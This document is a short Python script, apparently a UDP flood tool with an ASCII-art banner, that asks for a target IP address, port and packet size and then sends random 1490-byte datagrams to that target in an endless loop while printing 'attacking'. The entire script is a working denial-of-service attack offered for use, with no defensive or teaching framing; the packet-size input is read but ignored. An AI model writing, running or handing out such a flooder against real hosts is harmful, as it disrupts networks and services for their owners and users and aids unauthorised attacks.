import sys
import os
import time
import socket
import random
import threading

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

sys.ps1 = '\033[01;32m '
print(sys.ps1)
print('''

 ######     #    ######  #    # 
 #     #   # #   #     # #   #  
 #     #  #   #  #     # #  #   
 #     # #     # ######  ###    
 #     # ####### #   #   #  #   
 #     # #     # #    #  #   #  
 ######  #     # #     # #    # 
                                

''')


ip1 = input("Enter The IP of target : ")
port1 = int(input("Enter the Port : "))
size1 = int(input("Enter Packet size : "))

os.system("clear")

print(" connecting please wait...")

s1 = int(size1)
print("===================================================================")
print(" ")
print("Attacking Target %s : %s with packet size %s"%(ip1,port1,s1))
print(" ")
print("===================================================================")
while True:
     sock.sendto(bytes, (ip1,port1))
     print("attacking ", ip1, ":", port1)
